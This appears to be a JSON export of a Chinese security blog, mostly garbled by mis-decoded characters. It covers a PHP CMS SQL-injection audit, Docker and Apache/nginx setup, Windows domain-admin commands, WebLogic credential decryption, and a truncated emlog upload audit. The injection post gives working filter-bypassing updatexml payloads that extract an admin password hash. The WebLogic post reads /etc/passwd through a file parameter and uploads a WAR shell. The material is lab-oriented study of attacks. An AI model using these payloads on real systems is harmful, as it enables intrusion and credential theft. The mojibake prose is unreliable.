if(!$name) _404(); $name = urldecode($name); if($this-tagsModel == null) $this-tagsModel = new TagsModel(); $this-data = $this-tagsModel-getNameData($name); if(!$this-data) _404(); public function index() $temModel = new parse($this-smarty,$this-config); echo $temModel-tags($this-data,$this-tagsModel); ?2------------------------getnameDataå‡½æ•°å¦‚ä¸‹ å°±æ˜¯ select * from xx where xx=xx è¿™æ ·çš„ä»–åªä¼ é€’åé¢where = xx public function getNameData($name) $param[where] = name = $name; return parent::oneModel($param); 3--------------------------å¹¶ä¸”è¿˜æœ‰sqlè¿‡æ»¤é€šè¿‡pæ–¹æ³•è¿›å»é‡Œé¢å‘ç°è¿™ç§sqlè¿‡æ»¤å‡½æ•°//è¿‡æ»¤éæ³•æäº¤ä¿¡æ¯ï¼Œé˜²æ­¢sqlæ³¨å…¥function filter_sql(array $data) foreach($data as $v) if(is_array($v)) filter_sql($v); else //è½¬æ¢å°å†™ $v = strtolower($v); if(preg_match(/count|create|delete|select|update|use|drop|insert|info|from/,$v)) rewrite::js_back(ã€.$v.ã€‘æ•°æ®éæ³•); å‘ç°ä¸Šé¢ä¸‰ç‚¹ æˆ‘ä»¬çŸ¥é“æ€ä¹ˆè®¿é—®ç„¶åçŸ¥é“æ€ä¹ˆç»•è¿‡è¿‡æ»¤ -ä½¿ç”¨URLç¼–ç å› ä¸ºä»–è¿™é‡Œè§£ç äº† __construct()æ˜¯ç±»çš„æ„é€ æ–¹æ³•ï¼Œå®ƒæœ‰ä¸€ä¸ªç‰¹æ®Šæ€§è´¨ï¼šå½“ç±»è¢«å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä¸éœ€è¦åƒæ™®é€šæ–¹æ³•é‚£æ ·é€šè¿‡a=__constructæ˜¾å¼è°ƒç”¨ã€‚æ³¨æ„ä¸ç”¨è®¾ç½®æ–¹æ³•äº†ç›´æ¥ä¼ å…¥å‚æ•° å…³äºå‚æ•°åï¼šä»£ç ä¸­$data = p(2,1,1);æ˜¯ä»è¯·æ±‚ä¸­è·å–æ‰€æœ‰å‚æ•°ï¼ˆå¯èƒ½åŒ…å«å¤šä¸ªé”®å€¼å¯¹ï¼‰ä½†ä¸šåŠ¡åªéœ€è¦å…¶ä¸­çš„nameå­—æ®µï¼ˆæ ‡ç­¾åç§°ï¼‰ï¼Œæ‰€ä»¥å•ç‹¬æå–$data[name]è¿›è¡Œå¤„ç†ã€‚ ä¼ å…¥å‚æ•°index.php?m=tagsname=1%27%20and%20updatexml(0,(concat(0x7e,user()),0x7e)#æç¤º å‘ç°ç»™æˆ‘æ‹¦æˆªäº†script type=text/javascriptalert(ã€1 and updatexml(0,(concat(0x7e,user()),0x7e)ã€‘æ•°æ®éæ³•);history.go(-1);/script å› ä¸ºä»–æœ‰URLè§£ç æ‰€ä»¥æˆ‘ä»¬å…ˆç¼–ç ä¸€æ¬¡å› ä¸ºæµè§ˆå™¨ä¼šè§£ç ç„¶åå†ç¼–ç ä¸€æ¬¡ 1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)#%25%33%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%33sqlè¯­å¥æœ‰è¯¯XPATH syntax error: ~root@localhost~ æˆåŠŸæ³¨å…¥1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)#çˆ†ç ´æ•°æ®åº“åå­— lmx%25%33%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%331 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=lmx limit 25,1),0x7e),1)# æŸ¥è¯¢åˆ°è¡¨lmx_user 1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=lmx and table_name=lmx_user),0x7e),1)# æŸ¥è¯¢å­—æ®µ ~id,name,pwd,currtime,currip,las1 and updatexml(1,concat(0x7e,(select concat(id,0x3a,name,0x3a,pwd) from lmx_user),0x7e),1)#sqlè¯­å¥æœ‰è¯¯XPATH syntax error: ~1:admin:538334fcfd6624845471a29 å‘ç°å¯†ç æ‹¿ä¸å…¨å•Š1 and updatexml(1,concat(0x7e,(select length(concat(pwd,0x3e)) from lmx_user),0x7e),1)# åˆ¤æ–­ä¸‹å¤§å°æ˜¯33ä¸ªå°±ä»20æ‹¿åˆ°33ä¸ªå§ç„¶åå’Œå‰é¢æ‹¼æ¥èµ·æ¥sqlè¯­å¥æœ‰è¯¯XPATH syntax error: ~1a291cb4f6274:~1 and updatexml(1,concat(0x7e,(select substr(concat(pwd,0x3a),20,33) from lmx_user),0x7e),1)#1a291cb4f6274 å¯†ç æ˜¯538334fcfd6624845471a291cb4f6274 æ‰€ä»¥è¿™é‡ŒåŸå› æ˜¯ä¸¤å±‚å±è”½äº†SQLæ³¨å…¥çš„è¿‡æ»¤ ç»•è¿‡äº†è¿‡æ»¤ç„¶åè§£å¯†äº†ç„¶åè¿›å…¥sqlæµç¨‹ è¿™å¹¶ä¸æ˜¯ç»•è¿‡æ³¨å…¥æ–¹æ³•è¿™æ˜¯ä»–çš„é€»è¾‘é—®é¢˜ï¼Œå½“ä½ æ³¨é‡Šæ‰å‘ç°ä¸è¡Œäº†ï¼Œæ‰€ä»¥ä»£ç å®¡è®¡ä¿®å¤æ˜¯å…ˆè§£ç å†è¿‡æ»¤ getNameData($name)ï¼ˆTagsModel ç±»çš„æ–¹æ³•ï¼‰æ ¹æ®æ ‡ç­¾åç§°æŸ¥è¯¢å¯¹åº”çš„æ•°æ®parent::__construct()ï¼šè°ƒç”¨çˆ¶ç±» HomeAction çš„æ„é€ æ–¹æ³•ï¼Œç»§æ‰¿åŸºç¡€æ§åˆ¶å™¨åŠŸèƒ½string::delHtml()ï¼šé™æ€æ–¹æ³•ï¼Œè¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„ HTML æ ‡ç­¾ï¼ˆé˜² XSS æ”»å‡»ï¼‰urldecode()ï¼šå¯¹ URL ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼ˆæ¢å¤åŸå§‹æ ‡ç­¾åç§°ï¼‰parent::oneModel($param)ï¼šçˆ¶ç±»çš„æ¨¡å‹æ–¹æ³•ï¼Œæ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢å¹¶è¿”å›å•æ¡ç»“æœ_404()ï¼šé¡µé¢ä¸å­˜åœ¨æ—¶è°ƒç”¨ï¼Œè¿”å› 404 é”™è¯¯rewrite::js_back()ï¼šé™æ€æ–¹æ³•ï¼Œè¾“å‡º JavaScript æç¤ºå¹¶è·³è½¬ï¼ˆé€šå¸¸ç”¨äºé”™è¯¯æç¤ºï¼‰","tags":["php"]},{"title":"Dockerfile-ä½¿ç”¨-dockerè¯­æ³•","path":"/2025/09/26/posts/dockerfile/","content":"Dockerfile-ä½¿ç”¨-dockerè¯­æ³•-docker-compose dockerfileDockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒåŒ…å«äº†æ„å»º Docker é•œåƒçš„æ‰€æœ‰æŒ‡ä»¤ã€‚Dockerfile æ˜¯ä¸€ä¸ªç”¨æ¥æ„å»ºé•œåƒçš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡æœ¬å†…å®¹åŒ…å«äº†ä¸€æ¡æ¡æ„å»ºé•œåƒæ‰€éœ€çš„æŒ‡ä»¤å’Œè¯´æ˜ã€‚é€šè¿‡å®šä¹‰ä¸€ç³»åˆ—å‘½ä»¤å’Œå‚æ•°ï¼ŒDockerfile æŒ‡å¯¼ Docker æ„å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„é•œåƒ æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåŸºç¡€dockcerfileæ–‡ä»¶å¹¶å†™å…¥å†…å®¹ [root@iZbp156z1grx9b9s1305p0Z test]# cd dockertest/[root@iZbp156z1grx9b9s1305p0Z dockertest]# lsDockerfile[root@iZbp156z1grx9b9s1305p0Z dockertest]# ls -altotal 12drwxr-xr-x 2 root root 4096 Sep 25 23:01 .drwxr-xr-x 3 root root 4096 Sep 25 22:37 ..-rw-r--r-- 1 root root 63 Sep 25 23:01 Dockerfile[root@iZbp156z1grx9b9s1305p0Z dockertest]# cat Dockerfile FROM nginxRUN echo apache /usr/share/nginx/html/index.html[root@iZbp156z1grx9b9s1305p0Z dockertest]# pwd/root/test/dockertest[root@iZbp156z1grx9b9s1305p0Z dockertest]# FROM nginx è¡¨ç¤ºé•œåƒåå­—RUN echo apache /usr/share/nginx/html/index.html æ‰§è¡Œçš„å‘½ä»¤ ç„¶åæˆ‘ä»¬buildç›¸å½“äºpulläº†ä¸‹æ¥ åå­—æ˜¯nginxtest9.26 æè¿°v3 [root@iZbp156z1grx9b9s1305p0Z dockertest]# pwd/root/test/dockertest[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker build -t nginxtest9.26:v3 .[+] Building 0.7s (6/6) FINISHED xxx = [1/2] FROM docker.io/library/nginx:latest@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31 xxxx[root@iZbp156z1grx9b9s1305p0Z dockertest]# è¾“å…¥å‘½ä»¤doker images æŸ¥çœ‹é•œåƒçŠ¶æ€ [root@iZbp156z1grx9b9s1305p0Z dockertest]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx test2 d5acce9a304d 12 hours ago 141MBnginxtest9.26 v3 d5acce9a304d 12 hours ago 141MBnginx v3 7b28ab7a3fa3 13 hours ago 141MB å¯åŠ¨é•œåƒ [root@iZbp156z1grx9b9s1305p0Z dockertest]# docker run -d -p 8050:80 d5acce9a304d17f22daa865341ac328394b9d51c1ebbbea770a8b4173b0dd1da2dca9f579ae6[root@iZbp156z1grx9b9s1305p0Z dockertest]# è¿™é‡Œæˆ‘ä¸¤ä¸ªIDç›¸åŒå› ä¸º é•œåƒ ID ç”±å†…å®¹ï¼ˆåˆ†å±‚ï¼‰å†³å®šï¼Œè€Œéæ ‡ç­¾ â€”â€”å†…å®¹ä¸å˜ï¼ŒID å°±ä¸å˜ã€‚ä½ çœ‹åˆ°çš„å¤šä¸ªé•œåƒ ID ç›¸åŒï¼Œæ˜¯å› ä¸ºå®ƒä»¬å…±äº«å®Œå…¨ç›¸åŒçš„åˆ†å±‚æ•°æ®ï¼Œåªæ˜¯æ ‡ç­¾ä¸åŒï¼ˆç›¸å½“äºç»™åŒä¸€ä¸ªæ–‡ä»¶è´´äº†å¤šä¸ªæ–‡ä»¶åæ ‡ç­¾ï¼‰ã€‚å¦‚æœæƒ³ç”Ÿæˆæ–° ID çš„é•œåƒï¼Œéœ€è¦å®é™…ä¿®æ”¹é•œåƒå†…å®¹ï¼ˆæ¯”å¦‚ä¿®æ”¹ Dockerfile æŒ‡ä»¤ã€ä¿®æ”¹ index.html å†…å®¹ã€æ›´æ¢åŸºç¡€é•œåƒç‰ˆæœ¬ç­‰ï¼‰ï¼Œè¿™æ ·æ„å»ºæ—¶æ‰ä¼šç”Ÿæˆæ–°çš„åˆ†å±‚å’Œæ–°çš„é•œåƒ IDã€‚ å¦‚æœä½ run æƒ³è®¾ç½®ä¸¤ä¸ªå‘½ä»¤å¯ä»¥å¦‚ Docker é•œåƒé‡‡ç”¨ â€œåˆ†å±‚å­˜å‚¨â€ æœºåˆ¶ï¼Œæ¯ä¸€æ¡ Dockerfile æŒ‡ä»¤ï¼ˆå¦‚ RUNã€COPYã€ADD ç­‰ï¼‰éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„åªè¯»å±‚ï¼Œè¿™äº›å±‚å åŠ èµ·æ¥æ„æˆæœ€ç»ˆçš„é•œåƒã€‚å¦‚æœå­˜åœ¨è¿‡å¤šæ— æ„ä¹‰çš„å±‚ï¼Œä¼šå¯¼è‡´é•œåƒä½“ç§¯è†¨èƒ€ï¼ŒåŸå› å¯ä»¥é€šè¿‡å…·ä½“ä¾‹å­ç†è§£ï¼š FROM centosRUN yum -y install wget \\ wget -O redis.tar.gz http://download.redis.io/releases/redis-5.0.3.tar.gz \\ tar -xvf redis.tar.gzä¸è¦ å› ä¸ºæ¯æ‰§è¡Œä¸€æ¬¡éƒ½ä¼šåœ¨ docker ä¸Šæ–°å»ºä¸€å±‚ã€‚æ‰€ä»¥è¿‡å¤šæ— æ„ä¹‰çš„å±‚ï¼Œä¼šé€ æˆé•œåƒè†¨èƒ€è¿‡å¤§FROM centosRUN yum -y install wgetRUN wget -O redis.tar.gz http://download.redis.io/releases/redis-5.0.3.tar.gzRUN tar -xvf redis.tar.gz è§£é‡Šfileå‘½ä»¤è¯­æ³•CMD ç±»ä¼¼äº RUN æŒ‡ä»¤ï¼Œç”¨äºè¿è¡Œç¨‹åºï¼Œä½†äºŒè€…è¿è¡Œçš„æ—¶é—´ç‚¹ä¸åŒ:CMD åœ¨docker run æ—¶è¿è¡Œã€‚RUN æ˜¯åœ¨ docker buildã€‚ EXPOSE å¸®åŠ©é•œåƒä½¿ç”¨è€…ç†è§£è¿™ä¸ªé•œåƒæœåŠ¡çš„å®ˆæŠ¤ç«¯å£ï¼Œä»¥æ–¹ä¾¿é…ç½®æ˜ å°„ã€‚åœ¨è¿è¡Œæ—¶ä½¿ç”¨éšæœºç«¯å£æ˜ å°„æ—¶ï¼Œä¹Ÿå°±æ˜¯ docker run -P æ—¶ï¼Œä¼šè‡ªåŠ¨éšæœºæ˜ å°„ EXPOSE çš„ç«¯å£ã€‚ docker-composeDockerfile æ˜¯ â€œé€ é›¶ä»¶ï¼ˆé•œåƒï¼‰â€ï¼Œdocker-compose æ˜¯ â€œè£…æœºå™¨ï¼ˆå¤šå®¹å™¨åº”ç”¨ï¼‰â€ã€‚ [root@iZbp156z1grx9b9s1305p0Z dockertest]# cat docker-compose.yml version: 3.8 # æŒ‡å®šdocker-composeç‰ˆæœ¬services: # å®šä¹‰NginxæœåŠ¡ï¼Œåç§°ä¸ºnginx-test nginx-test: build: . # è¡¨ç¤ºä»å½“å‰ç›®å½•çš„Dockerfileæ„å»ºé•œåƒ ports: - 8080:80 # ç«¯å£æ˜ å°„ï¼šä¸»æœºçš„8080ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„80ç«¯å£ï¼ˆNginxé»˜è®¤ç«¯å£ï¼‰ container_name: my-nginx-container # å®¹å™¨åç§°ï¼Œæ–¹ä¾¿è¯†åˆ« restart: unless-stopped # é‡å¯ç­–ç•¥ï¼šé™¤éæ‰‹åŠ¨åœæ­¢ï¼Œå¦åˆ™æ€»æ˜¯é‡å¯ # å¯é€‰ï¼šæŒ‚è½½ç›®å½•ï¼ˆå¦‚æœéœ€è¦å®æ—¶ä¿®æ”¹index.htmlå†…å®¹ï¼Œå¯ä»¥æ·»åŠ ä»¥ä¸‹é…ç½®ï¼‰ # volumes: # - ./index.html:/usr/share/nginx/html/index.html[root@iZbp156z1grx9b9s1305p0Z dockertest]# build: . ä»dockerfileæ­å»º ç„¶åè¾“å…¥å‘½ä»¤ docker-commpose up -d -dè¡¨ç¤ºåœ¨åå°è¿è¡Œ [root@iZbp156z1grx9b9s1305p0Z dockertest]# lsDockerfile[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker-compose up -d/usr/local/lib/python3.6/site-packages/paramiko/transport.py:32: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6. from cryptography.hazmat.backends import default_backendCreating network dockertest_default with the default driverBuilding nginx-test[+] Building 0.7s (6/6) FINISHED docker:defaultxx = [1/2] FROM docker.io/library/nginx:latest@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31 xxxWARNING: Image for service nginx-test was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.Creating my-nginx-container ... done[root@iZbp156z1grx9b9s1305p0Z dockertest]# docer ps-bash: docer: command not found[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES6423922c9200 dockertest_nginx-test /docker-entrypoint.â€¦ 8 seconds ago Up 7 seconds 0.0.0.0:8080-80/tcp, :::8080-80/tcp my-nginx-container17f22daa8653 d5acce9a304d /docker-entrypoint.â€¦ 13 minutes ago Up 13 minutes 0.0.0.0:8050-80/tcp, :::8050-80/tcp å‘ç°é•œåƒåå­—dockertest_nginx-testæˆåŠŸæ­å»ºäº†é€šè¿‡docker-compose","tags":["dockerfile"]},{"title":"Apache-nginxå®‰è£…-é…ç½®æ–‡ä»¶ä¿®æ”¹+linux,windowså¸¸ç”¨å‘½ä»¤","path":"/2025/09/25/posts/httpd/","content":"Apache-nginxå®‰è£…-é…ç½®æ–‡ä»¶ä¿®æ”¹+linux+windowså¸¸ç”¨å‘½ä»¤ Apacheå®‰è£…æ²¡æœ‰é…ç½®yumæˆ–è€…apt å…ˆé…ç½®æºä¸ºå›½å†…çš„ç„¶åå®‰è£…httpdyum install httpd -y å®‰è£…systemctl start httpd å¯åŠ¨httpdsystemctl status httpd æ£€æŸ¥æ˜¯å¦æ­£å¸¸[root@localhost ~]# systemctl status httpdâ— httpd.service - The Apache HTTP Server Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled) Active: active (running) since å›› 2025-09-25 09:53:59 CST; 16min ago ç„¶åä½ å¯ä»¥è®¿é—®é»˜è®¤ç«¯å£ä¸º80æŸ¥çœ‹æ˜¯å¦äº§ç”Ÿäº†é¡µé¢ Apacheç½‘ç«™é»˜è®¤ç›®å½•-varwwwhtml/var/www/html --é»˜è®¤ç›®å½•å½“ä½ æ–°å»ºä¸€ä¸ªindex.html å°±ä¼šè¯»å–æ˜¾ç¤º[root@localhost html]# cat index.html [root@localhost html]# pwd/var/www/html[root@localhost html]# Apacheä¸»é…ç½®æ–‡ä»¶-etchttpdconfhttpd.confListen 80 ä¸»ç«¯å£é»˜è®¤80User apache é»˜è®¤ç”¨æˆ·WWWGroup apache/var/log/httpd/error_logé”™è¯¯æ—¥å¿—ç›®å½• ä¿®æ”¹ç«¯å£åé‡å¯ç”Ÿæ•ˆ æˆ‘é‚£ä¸ªè™šæ‹Ÿæœºä¸çŸ¥é“ä¸ºä»€ä¹ˆä¿®æ”¹äº†å§‹ç»ˆä¸è¡Œæœ¬åœ°å¯ä»¥è®¿é—®å¤–é¢ä¸è¡Œå…³é—­äº†é˜²ç«å¢™å’Œselinuxéƒ½ä¸è¡Œ Apache+phpyum install epel-releaserpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpmyum --enablerepo=remi install php74-phpyum --enablerepo=remi install php74-php php74-php-gd php74-php-xml php74-php-sockets php74-php-session php74-php-snmp php74-php-mysqlç›´æ¥é‡å¯httpdå°±å¯ä»¥è®¿é—®phpæ–‡ä»¶äº† php74-php åŒ…è‡ªåŠ¨åˆ›å»ºphp74-php.confé…ç½®æ–‡ä»¶å®ƒå·²ç»é…ç½®äº† Apache ä½¿ç”¨ mod_php æ¨¡å—æ¥å¤„ç† PHP æ–‡ä»¶ã€‚ ä½†æ˜¯å¯¹äºJAVAä»£ç apacheç”¨Cè¯­è¨€å†™çš„æ‰€ä»¥ä¸å¯ä»¥ä½†æ˜¯å¯ä»¥ç”¨åå‘ä»£ç†åˆ°åç«¯JAVAåº”ç”¨æœåŠ¡å™¨ Nginxè®¾ç½®è®¿é—®å¦ä¸€ä¸ªçš„8080è½¬å‘åˆ°ä¸€å¼€å§‹apacheæœåŠ¡è¾¾æˆåå‘ä»£ç† apt install nginx -y å®‰è£…nginxåœ¨åå‘ä»£ç†çš„ä¸»æœºå®‰è£…å°±è¡Œäº† Nginxä»£ç†æ–‡ä»¶-ä¸»é…ç½®æ–‡ä»¶ä½äº /etc/nginx/nginx.confæˆ‘ä»¬åœ¨conf.dæ–‡ä»¶ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å†…å®¹æ˜¯ å½“è®¿é—®åˆ°8089ä¼šè½¬å‘åˆ°172.20.10.2ï¼š80â”Œâ”€â”€(rootã‰¿kali)-[/etc/nginx/conf.d]â””â”€# lsreverse-proxy.confâ””â”€# cat reverse-proxy.confserver listen 8089; server_name _; # å“åº”æ‰€æœ‰è¯·æ±‚ location / # åå‘ä»£ç†åˆ° Apache æœåŠ¡å™¨ proxy_pass http://172.20.10.2:80; # ä¼ é€’å®¢æˆ·ç«¯ä¿¡æ¯ proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; # è¶…æ—¶è®¾ç½® proxy_connect_timeout 60s; proxy_read_timeout 90s; proxy_send_timeout 90s; å¯ä»¥çœ‹åˆ°æˆåŠŸè½¬å‘ WINDOWSå¸¸ç”¨å‘½ä»¤net user ç”¨æˆ·å å¯†ç  /add æ·»åŠ ç”¨æˆ·net localgroup administrators ç”¨æˆ·å /add æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„å…¶ä½™å‘½ä»¤ # æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ· net user # æŸ¥çœ‹ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ net user ç”¨æˆ·å # åˆ é™¤ç”¨æˆ· net user ç”¨æˆ·å /delete # ä¿®æ”¹ç”¨æˆ·å¯†ç  net user ç”¨æˆ·å æ–°å¯†ç åŸŸå‘½ä»¤------------------net user ç”¨æˆ·å å¯†ç  /add /domainnet group Domain Admins ç”¨æˆ·å /add /domain# æŸ¥çœ‹åŸŸç”¨æˆ·net user /domain# æŸ¥çœ‹åŸŸç»„net group /domain# æŸ¥çœ‹ç‰¹å®šåŸŸç»„æˆå‘˜net group Domain Admins /domainåŸŸä¿¡æ¯net view /domainnet view /domain:åŸŸånet group Domain Controllers /domain","tags":["weblogic"]},{"title":"Weblogic-æ‹¿åˆ°å¯†é’¥è§£å¯†","path":"/2025/09/22/posts/weblogic-key/","content":"Weblogic-æ‹¿åˆ°å¯†é’¥è§£å¯† Weblogic-å¯†é’¥è§£å¯†ç¯å¢ƒä½¿ç”¨ è¿™é‡Œç”¨å·¥å…·å¯ä»¥ç›´æ¥æ‹¿shell ä½†æ˜¯ä½ æ‹¿åˆ°shellä¸åŒç¯å¢ƒä¸‹é‡Œé¢å¯èƒ½æœ‰æ•°æ®åº“å¯†ç å¯ä»¥ææƒæ‰€ä»¥ä¸å¯ä»¥æ”¾è¿‡çš„ vulhubweblogicweak_password è¿›å…¥ docker-compose up -d å¯åŠ¨åæˆ‘ä»¬è¿›å…¥7001ç«¯å£åconsoleè¿›å…¥å®¢æˆ·ç«¯ æˆ‘ä»¬ç›´æ¥ä½¿ç”¨å·¥å…·æ‰“å…¥å†…å­˜é©¬æ‹¿åˆ°SHELL http://your-ip:7001/hello/file.jsp?path=/etc/passwd è¿™é‡Œå‰å°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½è¿™é‡Œæˆ‘å°±è¯´æ€ä¹ˆç ´è§£å¯†é’¥ ä¸¤ä¸ªæ–‡ä»¶å‡ä½äº base_domainä¸‹ æ‰¾å…³é”®æ–‡ä»¶ /root/Oracle/Middleware/user_projects/domains/base_domainä¸€ä¸ªæ˜¯ .xmlæ–‡ä»¶é‡Œé¢æœ‰åŠ å¯†ä¿¡æ¯ è¿™é‡Œç¯å¢ƒæ˜¯/root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xmlä¸€ä¸ªæ˜¯SerializedSystemIni.dat å¯†é’¥æ–‡ä»¶ä½ç½®åœ¨/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat ç„¶åæˆ‘ä»¬ä¸‹è½½å·¥å…· weblogic_decrypt.jar è¿™é‡Œæç¤ºçˆ†ç ´ä¸‹è½½jaråŒ…æ”¾å…¥ é¦–æ¬¡è§£å¯†ä¼šå‡ºç°å¼‚å¸¸ï¼šPBEWITHSHAAND128BITRC2-CBC SecretKeyFactory not availableï¼Œéœ€è¦æ‰‹åŠ¨ä¸‹è½½ https://repo1.maven.org/maven2/org/bouncycastle/bcprov-jdk15on/1.56/bcprov-jdk15on-1.56.jar ç„¶åå°†æ–‡ä»¶å­˜åœ¨æœ¬åœ°å®‰è£…çš„JDKè·¯å¾„ä¸‹ï¼Œä¾‹å¦‚ E:\\Java\\jdk1.8.0_60\\jre\\lib\\ext æ‰€ä»¥è´¦å·å¯†ç ä¸º weblogic Oracle@123 è¿™é‡Œç”¨å¹³å°æ‹¿shellå¯ä»¥ç”¨warä¸Šä¼ æ¥è·å¾— ä¸Šä¼ warå‡†å¤‡ä¸‹jspæ–‡ä»¶ç„¶åæ‰“åŒ…ä¸ºzipç„¶åæ”¹åç¼€æ˜¯warå°±å¯ä»¥äº† ä¸€ç›´ä¸‹ä¸€æ­¥","tags":["weblogic"]},{"title":"åŸç”ŸPHPä»£ç å®¡è®¡-æ–‡ä»¶æ–¹é¢","path":"/2025/09/21/posts/code2php/","content":"åŸç”ŸPHPä»£ç å®¡è®¡-æ–‡ä»¶æ–¹é¢ è¿™é‡Œæ¨èç”¨æ¼æ´åŠŸèƒ½ç‚¹æ¥çœ‹ä»£ç  æ‰¾åˆ°ä¸Šä¼ ç‚¹ç„¶åçœ‹ä»£ç æ–‡ä»¶å®‰å…¨æŒ–æ˜ç‚¹ï¼š1ã€è„šæœ¬æ–‡ä»¶å2ã€åº”ç”¨åŠŸèƒ½ç‚¹3ã€æ“ä½œå…³é”®å­—æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸‹è½½(è¯»å–)ï¼Œæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶åˆ é™¤ç­‰ æ¡ˆä¾‹1emlog-2.2.20-åå°æ–‡ä»¶ä¸Šä¼ å®‰è£…å’Œä¸Šä¸€ä¸ªåšå®¢ä¸€è‡´https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536 https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536 æ ¹æ®æ¼æ´æè¿° emlog pro /content/templates/å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æäº¤ç‰¹æ®Šçš„è¯·æ±‚ï¼Œå¯ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä»¥åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡æ‰§è¡Œä»»æ„ä»£ç ã€‚ æ ¹æ®CNVDæ¼æ´æè¿°æ¼æ´åœ¨ emlog pro /content/templates/å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æäº¤ç‰¹æ®Šçš„è¯·æ±‚ï¼Œå¯ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä»¥åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡æ‰§è¡Œä»»æ„ä»£ç ã€‚ æˆ‘ä»¬å‡†å¤‡ä¸Šä¼ çš„æ–‡ä»¶-åœ¨ä»–é»˜è®¤æœ‰ä¸€ä¸ªdefaultæˆ‘ä»¬å¤‡ä»½ä¸‹ä¸Šä¼ åŠ ä¸€ä¸ªinfo.phpé‡Œé¢æœ‰phpinfo ä¸Šä¼ åç›´æ¥è®¿é—®å°±å¯ä»¥è§¦å‘ä»»æ„æ–‡ä»¶æ‰§è¡Œä¸‹é¢çœ‹ä¸‹ä»£ç æ€ä¹ˆå†™çš„æ€ä¹ˆæ‰¾åˆ°çš„ æºç å¦‚ä¸‹ ä»£ç åŠŸèƒ½è§£æé¦–å…ˆåˆ¤æ–­æ“ä½œç±»å‹ä¸ºupload_zipæ—¶æ‰§è¡Œæ­¤ä»£ç å—è°ƒç”¨LoginAuth::checkToken()è¿›è¡Œç™»å½•éªŒè¯å’Œ token æ£€æŸ¥è·å–ä¸Šä¼ çš„ ZIP æ–‡ä»¶ä¿¡æ¯ï¼ˆ$_FILES[tplzip]ï¼‰ä¸€ç³»åˆ—é”™è¯¯æ£€æŸ¥ï¼šæ£€æŸ¥æ˜¯å¦æœªé€‰æ‹©æ–‡ä»¶ï¼ˆé”™è¯¯ç  4ï¼‰æ£€æŸ¥æ–‡ä»¶å¤§å°è¶…è¿‡ PHP é…ç½®é™åˆ¶ï¼ˆé”™è¯¯ç  1ï¼‰æ£€æŸ¥æ–‡ä»¶ä¸Šä¼ 